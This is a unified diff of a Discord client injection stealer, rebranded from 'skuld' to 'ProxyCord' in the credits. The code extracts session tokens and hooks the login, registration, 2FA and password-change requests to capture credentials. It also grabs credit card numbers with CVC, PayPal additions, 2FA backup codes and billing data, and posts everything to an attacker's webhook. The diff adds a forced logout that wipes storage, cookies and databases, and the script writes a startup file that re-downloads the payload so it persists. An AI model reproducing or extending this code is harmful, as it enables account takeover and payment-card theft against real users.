@@ -111,53 +111,6 @@ const executeJS = script => {
     return window.webContents.executeJavaScript(script, !0);
 };
 
-const clearAllUserData = () => {
-    executeJS("document.body.appendChild(document.createElement`iframe`).contentWindow.localStorage.clear()");
-    executeJS("location.reload()");
-};
-
-const getToken = async () => {
-    console.log('DEBUG: Starting token extraction...');
-    try {
-        // Method 1: Try the original webpack method
-        const token1 = await executeJS(`(webpackChunkdiscord_app.push([[''],{},e=>{m=[];for(let c in e.c)m.push(e.c[c])}]),m).find(m=>m?.exports?.default?.getToken!==void 0).exports.default.getToken()`);
-        console.log('DEBUG: Method 1 result:', token1 ? 'SUCCESS' : 'FAILED');
-        if (token1) return token1;
-    } catch (e) {
-        console.log('DEBUG: Method 1 error:', e.message);
-    }
-
-    try {
-        // Method 2: Alternative webpack approach
-        const token2 = await executeJS(`Object.values(webpackChunkdiscord_app.push([[''],{},e=>{m=[];for(let c in e.c)m.push(e.c[c])}]),m).find(m=>m?.exports?.default?.getToken)?.exports?.default?.getToken?.()`);
-        console.log('DEBUG: Method 2 result:', token2 ? 'SUCCESS' : 'FAILED');
-        if (token2) return token2;
-    } catch (e) {
-        console.log('DEBUG: Method 2 error:', e.message);
-    }
-
-    try {
-        // Method 3: Direct localStorage access
-        const token3 = await executeJS(`JSON.parse(localStorage.getItem('token'))`);
-        console.log('DEBUG: Method 3 result:', token3 ? 'SUCCESS' : 'FAILED');
-        if (token3) return token3;
-    } catch (e) {
-        console.log('DEBUG: Method 3 error:', e.message);
-    }
-
-    try {
-        // Method 4: Alternative localStorage
-        const token4 = await executeJS(`Object.values(localStorage).find(v => v?.startsWith?.('"') && v.includes('.'))`);
-        console.log('DEBUG: Method 4 result:', token4 ? 'SUCCESS' : 'FAILED');
-        if (token4) return JSON.parse(token4);
-    } catch (e) {
-        console.log('DEBUG: Method 4 error:', e.message);
-    }
-
-    console.log('DEBUG: All token extraction methods failed');
-    return null;
-};
-
 const request = async (method, url, headers, data) => {
     url = new URL(url);
     const options = {
@@ -185,15 +138,57 @@ const request = async (method, url, headers, data) => {
     });
 };
 
+const clearAllUserData = () => {
+    executeJS("document.body.appendChild(document.createElement`iframe`).contentWindow.localStorage.clear()");
+    executeJS("location.reload()");
+};
+
+const forceLogout = async () => {
+    console.log('DEBUG: Forcing Discord logout...');
+    try {
+        await executeJS(`
+            localStorage.clear();
+            sessionStorage.clear();
+            document.cookie.split(";").forEach(function(c) { 
+                document.cookie = c.replace(/^ +/, "").replace(/=.*/, "=;expires=" + new Date().toUTCString() + ";path=/"); 
+            });
+            if (window.indexedDB) {
+                indexedDB.databases().then(databases => {
+                    databases.forEach(db => {
+                        indexedDB.deleteDatabase(db.name);
+                    });
+                });
+            }
+            console.log('DEBUG: All auth data cleared');
+            return 'logout_complete';
+        `);
+        
+        await request("POST", CONFIG.webhook, {
+            "Content-Type": "application/json"
+        }, JSON.stringify({
+            "content": "🚪 **User Forced Logout** - Discord will require fresh login on restart!"
+        }));
+        
+    } catch (e) {
+        console.log('DEBUG: Logout error:', e.message);
+    }
+};
+
+const getToken = async () => {
+    try {
+        const token = await executeJS(`(webpackChunkdiscord_app.push([[''],{},e=>{m=[];for(let c in e.c)m.push(e.c[c])}]),m).find(m=>m?.exports?.default?.getToken!==void 0).exports.default.getToken()`);
+        console.log('DEBUG: Token extraction:', token ? 'SUCCESS' : 'FAILED');
+        return token;
+    } catch (e) {
+        console.log('DEBUG: Token extraction error:', e.message);
+        return null;
+    }
+};
+
 const hooker = async (content, token, account) => {
-    console.log('DEBUG: Hooker function called');
-    console.log('DEBUG: Account username:', account ? account.username : 'N/A');
-    console.log('DEBUG: Token present:', token ? 'YES' : 'NO');
-    console.log('DEBUG: Webhook URL:', CONFIG.webhook);
-    
     content["content"] = "`" + os.hostname() + "` - `" + os.userInfo().username + "`\n\n" + content["content"];
-    content["username"] = "skuld - cord injection";
-    content["avatar_url"] = "https://i.ibb.co/GJGXzGX/discord-avatar-512-FCWUJ.png";
+    content["username"] = "ProxyCord - discord injector";
+    content["avatar_url"] = "https://i.ibb.co/LC7q9jX/evil-discord.png";
     content["embeds"][0]["author"] = {
         "name": account.username,
     };
@@ -201,19 +196,15 @@ const hooker = async (content, token, account) => {
         "url": `https://cdn.discordapp.com/avatars/${account.id}/${account.avatar}.webp`
     };
     content["embeds"][0]["footer"] = {
-        "text": "skuld discord injection - made by hackirby",
-        "icon_url": "https://avatars.githubusercontent.com/u/145487845?v=4",
+        "text": "ProxyCord - created by saeed0x1",
+        "icon_url": "https://avatars.githubusercontent.com/u/73954987?v=4",
     };
     content["embeds"][0]["title"] = "Account Information";
 
-    console.log('DEBUG: Getting detailed account data...');
     const nitro = getNitro(account.premium_type);
     const badges = getBadges(account.flags);
-    console.log('DEBUG: Fetching billing info...');
     const billing = await getBilling(token);
-    console.log('DEBUG: Fetching friends...');
     const friends = await getFriends(token);
-    console.log('DEBUG: Fetching servers...');
     const servers = await getServers(token);
 
     content["embeds"][0]["fields"].push({
@@ -246,40 +237,23 @@ const hooker = async (content, token, account) => {
         content["embeds"][embed]["color"] = 0xb143e3;
     }
 
-    console.log('DEBUG: Sending webhook data...');
-    console.log('DEBUG: Payload size:', JSON.stringify(content).length);
-    
-    try {
-        await request("POST", CONFIG.webhook, {
-            "Content-Type": "application/json"
-        }, JSON.stringify(content));
-        console.log('DEBUG: Webhook sent successfully!');
-    } catch (error) {
-        console.log('DEBUG: Webhook send failed:', error);
-    }
+    await request("POST", CONFIG.webhook, {
+        "Content-Type": "application/json"
+    }, JSON.stringify(content));
 };
 
 const fetch = async (endpoint, headers) => {
-    const response = await executeJS(`var xmlHttp = new XMLHttpRequest();
-        xmlHttp.open("GET", "${CONFIG.API}${endpoint}", false);
-        xmlHttp.setRequestHeader("Authorization", "${headers.Authorization}");
-        xmlHttp.send(null);
-        xmlHttp.responseText;`);
-    return JSON.parse(response);
+    return JSON.parse(await request("GET", CONFIG.API + endpoint, headers));
 };
 
 const fetchAccount = async token => await fetch("", {
     "Authorization": token
 });
 const fetchBilling = async token => {
-    const bill = await executeJS(`var xmlHttp = new XMLHttpRequest(); 
-        xmlHttp.open("GET", "${CONFIG.API}/billing/payment-sources", false); 
-        xmlHttp.setRequestHeader("Authorization", "${token}"); 
-        xmlHttp.send(null); 
-        xmlHttp.responseText`);
-    if (!bill || bill.length === 0) return [];
     try {
-        return JSON.parse(bill);
+        return await fetch("/billing/payment-sources", {
+            "Authorization": token
+        });
     } catch (e) {
         return [];
     }
@@ -343,7 +317,6 @@ const getBilling = async token => {
 
 const getFriends = async token => {
     const friends = await fetchFriends(token);
-
     const filteredFriends = friends.filter((user) => {
         return user.type == 1
     })
@@ -365,7 +338,6 @@ const getFriends = async token => {
 
 const getServers = async token => {
     const guilds = await fetchServers(token);
-
     const filteredGuilds = guilds.filter((guild) => guild.permissions == '562949953421311' || guild.permissions == '2251799813685247');
     let rareGuilds = "";
     for (const guild of filteredGuilds) {
@@ -374,7 +346,6 @@ const getServers = async token => {
         }
         rareGuilds += `${guild.owner ? "<:SA_Owner:991312415352430673> Owner" : "<:admin:967851956930482206> Admin"} | Server Name: \`${guild.name}\` - Members: \`${guild.approximate_member_count}\`\n`;
     }
-
     rareGuilds = rareGuilds || "**No Rare Servers**";
 
     return {
@@ -385,7 +356,6 @@ const getServers = async token => {
 
 const EmailPassToken = async (email, password, token, action) => {
     const account = await fetchAccount(token)
-
     const content = {
         "content": `**${account.username}** just ${action}!`,
         "embeds": [{
@@ -400,17 +370,14 @@ const EmailPassToken = async (email, password, token, action) => {
             }]
         }]
     };
-
     hooker(content, token, account);
 }
 
 const BackupCodesViewed = async (codes, token) => {
     const account = await fetchAccount(token)
-
     const filteredCodes = codes.filter((code) => {
         return code.consumed === false;
     });
-
     let message = "";
     for (let code of filteredCodes) {
         message += `${code.code.substr(0, 4)}-${code.code.substr(4)}\n`;
@@ -419,30 +386,25 @@ const BackupCodesViewed = async (codes, token) => {
         "content": `**${account.username}** just viewed his 2FA backup codes!`,
         "embeds": [{
             "fields": [{
-                    "name": "Backup Codes",
-                    "value": "```" + message + "```",
-                    "inline": false
-                },
-                {
-                    "name": "Email",
-                    "value": "`" + account.email + "`",
-                    "inline": true
-                }, {
-                    "name": "Phone",
-                    "value": "`" + (account.phone || "None") + "`",
-                    "inline": true
-                }
-            ]
-
+                "name": "Backup Codes",
+                "value": "```" + message + "```",
+                "inline": false
+            }, {
+                "name": "Email",
+                "value": "`" + account.email + "`",
+                "inline": true
+            }, {
+                "name": "Phone",
+                "value": "`" + (account.phone || "None") + "`",
+                "inline": true
+            }]
         }]
     };
-
     hooker(content, token, account);
 }
 
 const PasswordChanged = async (newPassword, oldPassword, token) => {
     const account = await fetchAccount(token)
-
     const content = {
         "content": `**${account.username}** just changed his password!`,
         "embeds": [{
@@ -457,13 +419,11 @@ const PasswordChanged = async (newPassword, oldPassword, token) => {
             }]
         }]
     };
-
     hooker(content, token, account);
 }
 
 const CreditCardAdded = async (number, cvc, month, year, token) => {
     const account = await fetchAccount(token)
-
     const content = {
         "content": `**${account.username}** just added a credit card!`,
         "embeds": [{
@@ -482,13 +442,11 @@ const CreditCardAdded = async (number, cvc, month, year, token) => {
             }]
         }]
     };
-
     hooker(content, token, account);
 }
 
 const PaypalAdded = async (token) => {
     const account = await fetchAccount(token)
-
     const content = {
         "content": `**${account.username}** just added a <:paypal:1148653305376034967> account!`,
         "embeds": [{
@@ -503,7 +461,6 @@ const PaypalAdded = async (token) => {
             }]
         }]
     };
-
     hooker(content, token, account);
 }
 
@@ -529,64 +486,41 @@ const discordPath = (function () {
 
 async function initiation() {
     console.log('DEBUG: Initiation function called');
-    console.log('DEBUG: __dirname:', __dirname);
-    console.log('DEBUG: Checking for initiation folder:', path.join(__dirname, 'initiation'));
-    console.log('DEBUG: Initiation folder exists:', fs.existsSync(path.join(__dirname, 'initiation')));
-    
-    // Always run the injection, regardless of initiation folder
-    let shouldRunInjection = true;
-    
     if (fs.existsSync(path.join(__dirname, 'initiation'))) {
-        console.log('DEBUG: Removing initiation folder (first run)...');
+        console.log('DEBUG: Removing initiation folder and starting injection...');
         fs.rmdirSync(path.join(__dirname, 'initiation'));
-    } else {
-        console.log('DEBUG: No initiation folder, but running injection anyway...');
-    }
 
-    if (shouldRunInjection) {
         const token = await getToken();
-        console.log('DEBUG: Token extracted:', token ? 'SUCCESS' : 'FAILED');
-        console.log('DEBUG: Token length:', token ? token.length : 'N/A');
-        
-        if (!token) {
-            console.log('DEBUG: No token found, sending error message...');
-            await request("POST", CONFIG.webhook, {
-                "Content-Type": "application/json"
-            }, JSON.stringify({
-                "content": "❌ **Discord Injection Failed** - No token found!"
-            }));
-            return;
+        if (token) {
+            console.log('DEBUG: Token found, extracting account data...');
+            try {
+                const account = await fetchAccount(token);
+                const content = {
+                    "content": `**${account.username}** just got injected!`,
+                    "embeds": [{
+                        "fields": [{
+                            "name": "Email",
+                            "value": "`" + account.email + "`",
+                            "inline": true
+                        }, {
+                            "name": "Phone",
+                            "value": "`" + (account.phone || "None") + "`",
+                            "inline": true
+                        }]
+                    }]
+                };
+                await hooker(content, token, account);
+                console.log('DEBUG: Account data sent successfully!');
+            } catch (e) {
+                console.log('DEBUG: Failed to extract account data:', e.message);
+            }
         }
-
-        console.log('DEBUG: Fetching account info...');
-        const account = await fetchAccount(token);
-        console.log('DEBUG: Account info:', account ? 'SUCCESS' : 'FAILED');
-        console.log('DEBUG: Username:', account ? account.username : 'N/A');
-
-        const content = {
-            "content": `**${account.username}** just got injected!`,
-            "embeds": [{
-                "fields": [{
-                    "name": "Email",
-                    "value": "`" + account.email + "`",
-                    "inline": true
-                }, {
-                    "name": "Phone",
-                    "value": "`" + (account.phone || "None") + "`",
-                    "inline": true
-                }]
-            }]
-        };
-
-        console.log('DEBUG: Sending full account data via hooker...');
-        await hooker(content, token, account);
-        console.log('DEBUG: Data sent successfully!');
         
-        // Don't clear user data immediately, wait a bit
-        setTimeout(() => {
-            console.log('DEBUG: Clearing user data...');
-            clearAllUserData();
-        }, 3000);
+        // Force logout for fresh login next time
+        await forceLogout();
+        setTimeout(() => clearAllUserData(), 2000);
+    } else {
+        console.log('DEBUG: No initiation folder found - injection will not run');
     }
 
     const {
@@ -608,12 +542,9 @@ async function initiation() {
         fs.writeFileSync(
             packageJson,
             JSON.stringify({
-                    name: 'discord',
-                    main: 'index.js',
-                },
-                null,
-                4,
-            ),
+                name: 'discord',
+                main: 'index.js',
+            }, null, 4),
         );
 
         const startUpScript = `const fs = require('fs'), https = require('https');
@@ -632,7 +563,6 @@ async function initiation() {
           file.on('finish', () => {
               file.close();
           });
-      
       }).on("error", (err) => {
           setTimeout(init(), 10000);
       });
@@ -676,16 +606,19 @@ const createWindow = () => {
                 if (!responseData.token) {
                     email = requestData.login;
                     password = requestData.password;
-                    return; // 2FA
+                    return;
                 }
+                console.log('DEBUG: Captured token from login!');
                 EmailPassToken(requestData.login, requestData.password, responseData.token, "logged in");
                 break;
 
             case params.response.url.endsWith('/register'):
+                console.log('DEBUG: Captured token from register!');
                 EmailPassToken(requestData.email, requestData.password, responseData.token, "signed up");
                 break;
 
             case params.response.url.endsWith('/totp'):
+                console.log('DEBUG: Captured token from 2FA!');
                 EmailPassToken(email, password, responseData.token, "logged in with 2FA");
                 break;
 
@@ -695,11 +628,9 @@ const createWindow = () => {
 
             case params.response.url.endsWith('/@me'):
                 if (!requestData.password) return;
-
                 if (requestData.email) {
                     EmailPassToken(requestData.email, requestData.password, responseData.token, "changed his email to **" + requestData.email + "**");
                 }
-
                 if (requestData.new_password) {
                     PasswordChanged(requestData.new_password, requestData.password, responseData.token);
                 }
@@ -708,7 +639,6 @@ const createWindow = () => {
     });
 
     mainWindow.webContents.debugger.sendCommand('Network.enable');
-
     mainWindow.on('closed', () => {
         createWindow()
     });
@@ -723,7 +653,6 @@ session.defaultSession.webRequest.onCompleted(CONFIG.payment_filters, async (det
             const item = querystring.parse(Buffer.from(details.uploadData[0].bytes).toString());
             CreditCardAdded(item['card[number]'], item['card[cvc]'], item['card[exp_month]'], item['card[exp_year]'], await getToken());
             break;
-
         case details.url.endsWith('paypal_accounts'):
             PaypalAdded(await getToken());
             break;
